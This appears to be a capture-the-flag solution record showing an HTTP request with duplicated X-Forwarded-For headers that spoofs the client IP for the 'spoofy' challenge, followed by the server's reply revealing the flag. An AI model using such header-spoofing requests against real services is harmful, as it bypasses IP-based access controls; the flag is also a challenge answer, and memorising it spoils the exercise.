Request
```
GET / HTTP/1.1
Host: actf-spoofy.herokuapp.com
Content-Length: 0
X-Forwarded-For: 1.3.3.7, 1.3.3.7
X-Forwarded-For: 
X-Forwarded-For: 1.3.3.7, 1.3.3.7

```

Response
```
HTTP/1.1 200 OK
Connection: keep-alive
Server: gunicorn/20.0.4
Date: Sat, 03 Apr 2021 11:14:43 GMT
Content-Type: text/plain; charset=utf-8
Content-Length: 66
Via: 1.1 vegur

Hello 1337 haxx0r, here's the flag! actf{spoofing_is_quite_spiffy}
```